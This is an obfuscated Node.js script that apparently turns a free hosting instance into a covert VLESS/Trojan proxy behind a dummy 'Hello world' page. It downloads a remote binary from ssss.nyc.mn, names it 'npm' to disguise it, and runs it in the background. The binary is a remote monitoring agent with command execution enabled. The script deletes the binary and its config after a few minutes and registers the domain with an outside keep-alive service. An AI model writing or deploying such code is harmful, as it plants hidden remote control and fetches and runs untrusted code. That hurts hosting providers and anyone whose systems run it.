const _0x20c62a=_0x3121;(function(_0x6dff4d,_0x259d31){const _0xa48cb0=_0x3121,_0x263057=_0x6dff4d();while(!![]){try{const _0x2b63d8=parseInt(_0xa48cb0(0x215))/0x1+-parseInt(_0xa48cb0(0x1f2))/0x2+parseInt(_0xa48cb0(0x1d6))/0x3*(parseInt(_0xa48cb0(0x206))/0x4)+-parseInt(_0xa48cb0(0x1de))/0x5*(-parseInt(_0xa48cb0(0x19a))/0x6)+-parseInt(_0xa48cb0(0x19b))/0x7*(parseInt(_0xa48cb0(0x1cb))/0x8)+-parseInt(_0xa48cb0(0x19f))/0x9*(-parseInt(_0xa48cb0(0x1ea))/0xa)+-parseInt(_0xa48cb0(0x1a2))/0xb*(parseInt(_0xa48cb0(0x1fc))/0xc);if(_0x2b63d8===_0x259d31)break;else _0x263057['push'](_0x263057['shift']());}catch(_0x19307a){_0x263057['push'](_0x263057['shift']());}}}(_0x455c,0xbfba9));function _0x455c(){const _0x342850=['pop','Failed\x20to\x20resolve\x20','setsid\x20nohup\x20./npm\x20-s\x20','get','SUB_PATH','arm64','close','length','aarch64','decode','npm\x20download\x20successfully','find','every','hug','npm\x20is\x20already\x20running,\x20skip\x20running...','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','then','NEZHA_SERVER','net','2083','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&',':443?security=tls&sni=','path','4603928Hxvtho','Server\x20is\x20running\x20on\x20port\x20','arch','1.1.1.1','unlink','https://amd64.ssss.nyc.mn/v1','false','NEZHA_KEY','8443','includes','createWriteStream','3VqqvQW','base64','\x20-p\x20','concat','utf8','digest','8.8.4.4','from','845010tssytr','data','slice','connect','efe546ae-51da-4752-bbfb-5922f47bc831','/bin/bash','client_secret:\x20','listen','once','UUID','2053','createHash','1830JTUjMf','buffer','index.html','https://arm64.ssss.nyc.mn/v1','Status','NEZHA_PORT','text/html','https://amd64.ssss.nyc.mn/agent','525956zfBoNA','writeHead','trim','send','axios','Answer','readUInt16BE','utf-8','&fp=chrome&type=ws&host=','hex','808236ivAMeo','true','application/dns-json','pipe','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','https://arm64.ssss.nyc.mn/agent','application/json','finish','crypto','DOMAIN','1367524YBIccU','2096','&type=A','text/plain','url','map','reduce','readUInt8','&path=%2F','chmod\x20+x\x20npm','connection','npm','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','npm\x20is\x20running','replace','960852CtGNst','trojan://','6VqXEgc','7MVhuFZ','Automatic\x20Access\x20Task\x20added\x20successfully','https://','isp','14103RigpZS','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','createServer','22NHXdrH','http',':443?encryption=none&security=tls&sni=','end','error','toString','join','vless://','write','env','config.yaml','log','catch','sha224','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','NAME','arm','substr'];_0x455c=function(){return _0x342850;};return _0x455c();}const os=require('os'),http=require(_0x20c62a(0x1a3)),fs=require('fs'),axios=require(_0x20c62a(0x1f6)),net=require(_0x20c62a(0x1c6)),path=require(_0x20c62a(0x1ca)),crypto=require(_0x20c62a(0x204)),{Buffer}=require(_0x20c62a(0x1eb)),{exec,execSync}=require('child_process'),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x20c62a(0x1ab)][_0x20c62a(0x1e7)]||_0x20c62a(0x1e2),NEZHA_SERVER=process[_0x20c62a(0x1ab)][_0x20c62a(0x1c5)]||'',NEZHA_PORT=process[_0x20c62a(0x1ab)][_0x20c62a(0x1ef)]||'',NEZHA_KEY=process[_0x20c62a(0x1ab)][_0x20c62a(0x1d2)]||'',DOMAIN=process[_0x20c62a(0x1ab)][_0x20c62a(0x205)]||'',AUTO_ACCESS=process['env']['AUTO_ACCESS']||!![],WSPATH=process[_0x20c62a(0x1ab)]['WSPATH']||UUID[_0x20c62a(0x1e0)](0x0,0x8),SUB_PATH=process[_0x20c62a(0x1ab)][_0x20c62a(0x1b8)]||_0x20c62a(0x1c1),NAME=process[_0x20c62a(0x1ab)][_0x20c62a(0x1b1)]||'Hug',PORT=process['env']['PORT']||0x1eb4;let ISP='';const GetISP=async()=>{const _0x1f4336=_0x20c62a;try{const _0xb7ae80=await axios[_0x1f4336(0x1b7)]('https://api.ip.sb/geoip'),_0x4dd9e6=_0xb7ae80['data'];ISP=(_0x4dd9e6['country_code']+'-'+_0x4dd9e6[_0x1f4336(0x19e)])['replace'](/ /g,'_');}catch(_0x43dfb9){ISP='Unknown';}};GetISP();const httpServer=http[_0x20c62a(0x1a1)]((_0x1c26a3,_0x4689d6)=>{const _0x40374a=_0x20c62a;if(_0x1c26a3[_0x40374a(0x20a)]==='/'){const _0x14f698=path[_0x40374a(0x1a8)](__dirname,_0x40374a(0x1ec));fs['readFile'](_0x14f698,_0x40374a(0x1da),(_0x5e249f,_0x1f4a36)=>{const _0x3febb3=_0x40374a;if(_0x5e249f){_0x4689d6[_0x3febb3(0x1f3)](0xc8,{'Content-Type':_0x3febb3(0x1f0)}),_0x4689d6[_0x3febb3(0x1a5)]('Hello\x20world!');return;}_0x4689d6[_0x3febb3(0x1f3)](0xc8,{'Content-Type':_0x3febb3(0x1f0)}),_0x4689d6[_0x3febb3(0x1a5)](_0x1f4a36);});return;}else{if(_0x1c26a3['url']==='/'+SUB_PATH){const _0x3d2b82=NAME?NAME+'-'+ISP:ISP,_0x192687=_0x40374a(0x1a9)+UUID+'@'+DOMAIN+_0x40374a(0x1a4)+DOMAIN+_0x40374a(0x1fa)+DOMAIN+_0x40374a(0x20e)+WSPATH+'#'+_0x3d2b82,_0x51967f=_0x40374a(0x199)+UUID+'@'+DOMAIN+_0x40374a(0x1c9)+DOMAIN+_0x40374a(0x1fa)+DOMAIN+_0x40374a(0x20e)+WSPATH+'#'+_0x3d2b82,_0x34a921=_0x192687+'\x0a'+_0x51967f,_0x35deaa=Buffer[_0x40374a(0x1dd)](_0x34a921)[_0x40374a(0x1a7)](_0x40374a(0x1d7));_0x4689d6[_0x40374a(0x1f3)](0xc8,{'Content-Type':_0x40374a(0x209)}),_0x4689d6['end'](_0x35deaa+'\x0a');}else _0x4689d6['writeHead'](0x194,{'Content-Type':'text/plain'}),_0x4689d6[_0x40374a(0x1a5)]('Not\x20Found\x0a');}}),wss=new WebSocket['Server']({'server':httpServer}),uuid=UUID[_0x20c62a(0x214)](/-/g,''),DNS_SERVERS=[_0x20c62a(0x1dc),_0x20c62a(0x1ce)];function resolveHost(_0x44415d){return new Promise((_0x1f9d8d,_0x12b18a)=>{if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/['test'](_0x44415d)){_0x1f9d8d(_0x44415d);return;}let _0x59a975=0x0;function _0x29899c(){const _0x39c74d=_0x3121;if(_0x59a975>=DNS_SERVERS[_0x39c74d(0x1bb)]){_0x12b18a(new Error(_0x39c74d(0x1b5)+_0x44415d+'\x20with\x20all\x20DNS\x20servers'));return;}const _0x40cd9c=DNS_SERVERS[_0x59a975];_0x59a975++;const _0x50251b='https://dns.google/resolve?name='+encodeURIComponent(_0x44415d)+_0x39c74d(0x208);axios[_0x39c74d(0x1b7)](_0x50251b,{'timeout':0x1388,'headers':{'Accept':_0x39c74d(0x1fe)}})[_0x39c74d(0x1c4)](_0x1cb3c0=>{const _0x12326d=_0x39c74d,_0x2dff68=_0x1cb3c0[_0x12326d(0x1df)];if(_0x2dff68[_0x12326d(0x1ee)]===0x0&&_0x2dff68[_0x12326d(0x1f7)]&&_0x2dff68[_0x12326d(0x1f7)][_0x12326d(0x1bb)]>0x0){const _0x3bc924=_0x2dff68['Answer'][_0x12326d(0x1bf)](_0x3e93ff=>_0x3e93ff['type']===0x1);if(_0x3bc924){_0x1f9d8d(_0x3bc924['data']);return;}}_0x29899c();})[_0x39c74d(0x1ae)](_0x2e77e1=>{_0x29899c();});}_0x29899c();});}function handleVlessConnection(_0x45f8a2,_0x7cdec6){const _0x11f92e=_0x20c62a,[_0x212ac5]=_0x7cdec6,_0x35bac3=_0x7cdec6[_0x11f92e(0x1e0)](0x1,0x11);if(!_0x35bac3[_0x11f92e(0x1c0)]((_0x2c3a76,_0x552692)=>_0x2c3a76==parseInt(uuid[_0x11f92e(0x1b3)](_0x552692*0x2,0x2),0x10)))return![];let _0x236de1=_0x7cdec6['slice'](0x11,0x12)[_0x11f92e(0x20d)]()+0x13;const _0x5095ca=_0x7cdec6[_0x11f92e(0x1e0)](_0x236de1,_0x236de1+=0x2)[_0x11f92e(0x1f8)](0x0),_0x4b070a=_0x7cdec6['slice'](_0x236de1,_0x236de1+=0x1)[_0x11f92e(0x20d)](),_0x420ecb=_0x4b070a==0x1?_0x7cdec6['slice'](_0x236de1,_0x236de1+=0x4)[_0x11f92e(0x1a8)]('.'):_0x4b070a==0x2?new TextDecoder()[_0x11f92e(0x1bd)](_0x7cdec6[_0x11f92e(0x1e0)](_0x236de1+0x1,_0x236de1+=0x1+_0x7cdec6[_0x11f92e(0x1e0)](_0x236de1,_0x236de1+0x1)[_0x11f92e(0x20d)]())):_0x4b070a==0x3?_0x7cdec6[_0x11f92e(0x1e0)](_0x236de1,_0x236de1+=0x10)[_0x11f92e(0x20c)]((_0x139b7e,_0x4aadf6,_0x275629,_0x292971)=>_0x275629%0x2?_0x139b7e[_0x11f92e(0x1d9)](_0x292971[_0x11f92e(0x1e0)](_0x275629-0x1,_0x275629+0x1)):_0x139b7e,[])[_0x11f92e(0x20b)](_0x417c6a=>_0x417c6a[_0x11f92e(0x1f8)](0x0)['toString'](0x10))[_0x11f92e(0x1a8)](':'):'';_0x45f8a2[_0x11f92e(0x1f5)](new Uint8Array([_0x212ac5,0x0]));const _0x2fea1c=createWebSocketStream(_0x45f8a2);return resolveHost(_0x420ecb)['then'](_0x457a84=>{const _0x1dd0b3=_0x11f92e;net[_0x1dd0b3(0x1e1)]({'host':_0x457a84,'port':_0x5095ca},function(){const _0x3f9dfe=_0x1dd0b3;this[_0x3f9dfe(0x1aa)](_0x7cdec6[_0x3f9dfe(0x1e0)](_0x236de1)),_0x2fea1c['on'](_0x3f9dfe(0x1a6),()=>{})[_0x3f9dfe(0x1ff)](this)['on']('error',()=>{})[_0x3f9dfe(0x1ff)](_0x2fea1c);})['on'](_0x1dd0b3(0x1a6),()=>{});})[_0x11f92e(0x1ae)](_0x440bc0=>{const _0x3b3147=_0x11f92e;net['connect']({'host':_0x420ecb,'port':_0x5095ca},function(){const _0x499e5b=_0x3121;this[_0x499e5b(0x1aa)](_0x7cdec6[_0x499e5b(0x1e0)](_0x236de1)),_0x2fea1c['on'](_0x499e5b(0x1a6),()=>{})[_0x499e5b(0x1ff)](this)['on']('error',()=>{})['pipe'](_0x2fea1c);})['on'](_0x3b3147(0x1a6),()=>{});}),!![];}function handleTrojanConnection(_0x1a92c9,_0x1653f9){const _0x24e344=_0x20c62a;try{if(_0x1653f9['length']<0x3a)return![];const _0x52a996=_0x1653f9[_0x24e344(0x1e0)](0x0,0x38)[_0x24e344(0x1a7)](),_0x2af617=[UUID];let _0x45fa8e=null;for(const _0x9d1402 of _0x2af617){const _0x1b3e02=crypto[_0x24e344(0x1e9)](_0x24e344(0x1af))['update'](_0x9d1402)[_0x24e344(0x1db)](_0x24e344(0x1fb));if(_0x1b3e02===_0x52a996){_0x45fa8e=_0x9d1402;break;}}if(!_0x45fa8e)return![];let _0x5c55f6=0x38;_0x1653f9[_0x5c55f6]===0xd&&_0x1653f9[_0x5c55f6+0x1]===0xa&&(_0x5c55f6+=0x2);const _0x120a95=_0x1653f9[_0x5c55f6];if(_0x120a95!==0x1)return![];_0x5c55f6+=0x1;const _0x2c6a03=_0x1653f9[_0x5c55f6];_0x5c55f6+=0x1;let _0x385f5e,_0x27d3cb;if(_0x2c6a03===0x1)_0x385f5e=_0x1653f9[_0x24e344(0x1e0)](_0x5c55f6,_0x5c55f6+0x4)[_0x24e344(0x1a8)]('.'),_0x5c55f6+=0x4;else{if(_0x2c6a03===0x3){const _0x421c1e=_0x1653f9[_0x5c55f6];_0x5c55f6+=0x1,_0x385f5e=_0x1653f9[_0x24e344(0x1e0)](_0x5c55f6,_0x5c55f6+_0x421c1e)[_0x24e344(0x1a7)](),_0x5c55f6+=_0x421c1e;}else{if(_0x2c6a03===0x4)_0x385f5e=_0x1653f9[_0x24e344(0x1e0)](_0x5c55f6,_0x5c55f6+0x10)[_0x24e344(0x20c)]((_0x21d392,_0x5c90fe,_0x242391,_0x2d3b50)=>_0x242391%0x2?_0x21d392[_0x24e344(0x1d9)](_0x2d3b50[_0x24e344(0x1e0)](_0x242391-0x1,_0x242391+0x1)):_0x21d392,[])[_0x24e344(0x20b)](_0x11e4a7=>_0x11e4a7[_0x24e344(0x1f8)](0x0)[_0x24e344(0x1a7)](0x10))[_0x24e344(0x1a8)](':'),_0x5c55f6+=0x10;else return![];}}_0x27d3cb=_0x1653f9[_0x24e344(0x1f8)](_0x5c55f6),_0x5c55f6+=0x2;_0x5c55f6<_0x1653f9[_0x24e344(0x1bb)]&&_0x1653f9[_0x5c55f6]===0xd&&_0x1653f9[_0x5c55f6+0x1]===0xa&&(_0x5c55f6+=0x2);const _0x4d00ae=createWebSocketStream(_0x1a92c9);return resolveHost(_0x385f5e)[_0x24e344(0x1c4)](_0x59d066=>{const _0x13b57b=_0x24e344;net[_0x13b57b(0x1e1)]({'host':_0x59d066,'port':_0x27d3cb},function(){const _0x54400d=_0x13b57b;_0x5c55f6<_0x1653f9[_0x54400d(0x1bb)]&&this[_0x54400d(0x1aa)](_0x1653f9[_0x54400d(0x1e0)](_0x5c55f6)),_0x4d00ae['on'](_0x54400d(0x1a6),()=>{})[_0x54400d(0x1ff)](this)['on'](_0x54400d(0x1a6),()=>{})[_0x54400d(0x1ff)](_0x4d00ae);})['on'](_0x13b57b(0x1a6),()=>{});})['catch'](_0x16fa06=>{const _0x3016c0=_0x24e344;net[_0x3016c0(0x1e1)]({'host':_0x385f5e,'port':_0x27d3cb},function(){const _0x24e63f=_0x3016c0;_0x5c55f6<_0x1653f9['length']&&this['write'](_0x1653f9[_0x24e63f(0x1e0)](_0x5c55f6)),_0x4d00ae['on'](_0x24e63f(0x1a6),()=>{})[_0x24e63f(0x1ff)](this)['on'](_0x24e63f(0x1a6),()=>{})[_0x24e63f(0x1ff)](_0x4d00ae);})['on'](_0x3016c0(0x1a6),()=>{});}),!![];}catch(_0x34a9d6){return![];}}function _0x3121(_0x116687,_0x5abe79){_0x116687=_0x116687-0x199;const _0x455c2d=_0x455c();let _0x312185=_0x455c2d[_0x116687];return _0x312185;}wss['on'](_0x20c62a(0x210),(_0xf3fbcb,_0x3a7c4c)=>{const _0x22a6bb=_0x20c62a,_0x244a72=_0x3a7c4c[_0x22a6bb(0x20a)]||'';_0xf3fbcb[_0x22a6bb(0x1e6)]('message',_0x1691eb=>{const _0x35657b=_0x22a6bb;if(_0x1691eb[_0x35657b(0x1bb)]>0x11&&_0x1691eb[0x0]===0x0){const _0x532a15=_0x1691eb[_0x35657b(0x1e0)](0x1,0x11),_0x373f56=_0x532a15[_0x35657b(0x1c0)]((_0x40e417,_0x15282b)=>_0x40e417==parseInt(uuid[_0x35657b(0x1b3)](_0x15282b*0x2,0x2),0x10));if(_0x373f56){!handleVlessConnection(_0xf3fbcb,_0x1691eb)&&_0xf3fbcb[_0x35657b(0x1ba)]();return;}}!handleTrojanConnection(_0xf3fbcb,_0x1691eb)&&_0xf3fbcb[_0x35657b(0x1ba)]();})['on'](_0x22a6bb(0x1a6),()=>{});});const getDownloadUrl=()=>{const _0x492060=_0x20c62a,_0x242af0=os[_0x492060(0x1cd)]();return _0x242af0===_0x492060(0x1b2)||_0x242af0===_0x492060(0x1b9)||_0x242af0===_0x492060(0x1bc)?!NEZHA_PORT?_0x492060(0x1ed):_0x492060(0x201):!NEZHA_PORT?_0x492060(0x1d0):_0x492060(0x1f1);},downloadFile=async()=>{const _0x259d5c=_0x20c62a;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x4bb6b2=getDownloadUrl(),_0x38b46a=await axios({'method':_0x259d5c(0x1b7),'url':_0x4bb6b2,'responseType':'stream'}),_0x18f441=fs[_0x259d5c(0x1d5)]('npm');return _0x38b46a[_0x259d5c(0x1df)][_0x259d5c(0x1ff)](_0x18f441),new Promise((_0x4b0646,_0x2b0858)=>{const _0x4962ae=_0x259d5c;_0x18f441['on'](_0x4962ae(0x203),()=>{const _0x139dec=_0x4962ae;console[_0x139dec(0x1ad)](_0x139dec(0x1be)),exec(_0x139dec(0x20f),_0x3e726d=>{if(_0x3e726d)_0x2b0858(_0x3e726d);_0x4b0646();});}),_0x18f441['on'](_0x4962ae(0x1a6),_0x2b0858);});}catch(_0x31baa6){throw _0x31baa6;}},runnz=async()=>{const _0xf39f03=_0x20c62a;try{const _0xc5f0ce=execSync(_0xf39f03(0x1a0),{'encoding':_0xf39f03(0x1f9)});if(_0xc5f0ce[_0xf39f03(0x1f4)]()!==''){console[_0xf39f03(0x1ad)](_0xf39f03(0x1c2));return;}}catch(_0x498b9){}await downloadFile();let _0x152fb9='',_0x3fc4b3=['443',_0xf39f03(0x1d3),_0xf39f03(0x207),'2087',_0xf39f03(0x1c7),_0xf39f03(0x1e8)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x4157ed=_0x3fc4b3[_0xf39f03(0x1d4)](NEZHA_PORT)?'--tls':'';_0x152fb9=_0xf39f03(0x1b6)+NEZHA_SERVER+':'+NEZHA_PORT+_0xf39f03(0x1d8)+NEZHA_KEY+'\x20'+_0x4157ed+_0xf39f03(0x1c8);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x4cd688=NEZHA_SERVER[_0xf39f03(0x1d4)](':')?NEZHA_SERVER['split'](':')[_0xf39f03(0x1b4)]():'',_0x3d36c0=_0x3fc4b3[_0xf39f03(0x1d4)](_0x4cd688)?_0xf39f03(0x1fd):_0xf39f03(0x1d1),_0x50d7e8=_0xf39f03(0x1e4)+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+_0xf39f03(0x200)+_0x3d36c0+_0xf39f03(0x1c3)+UUID;fs['writeFileSync']('config.yaml',_0x50d7e8);}_0x152fb9=_0xf39f03(0x212);}else{console[_0xf39f03(0x1ad)](_0xf39f03(0x1b0));return;}}try{exec(_0x152fb9,{'shell':_0xf39f03(0x1e3)},_0x2e47b5=>{const _0x3cade3=_0xf39f03;if(_0x2e47b5)console[_0x3cade3(0x1a6)]('npm\x20running\x20error:',_0x2e47b5);else console['log'](_0x3cade3(0x213));});}catch(_0x58bc63){console[_0xf39f03(0x1a6)]('error:\x20'+_0x58bc63);}};async function addAccessTask(){const _0x4feabd=_0x20c62a;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x43b846=_0x4feabd(0x19d)+DOMAIN;try{const _0xba831b=await axios['post']('https://oooo.serv00.net/add-url',{'url':_0x43b846},{'headers':{'Content-Type':_0x4feabd(0x202)}});console[_0x4feabd(0x1ad)](_0x4feabd(0x19c));}catch(_0xc0d62){}}const delFiles=()=>{const _0x38ef6f=_0x20c62a;fs[_0x38ef6f(0x1cf)](_0x38ef6f(0x211),()=>{}),fs[_0x38ef6f(0x1cf)](_0x38ef6f(0x1ac),()=>{});};httpServer[_0x20c62a(0x1e5)](PORT,()=>{const _0x875a94=_0x20c62a;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console['log'](_0x875a94(0x1cc)+PORT);});
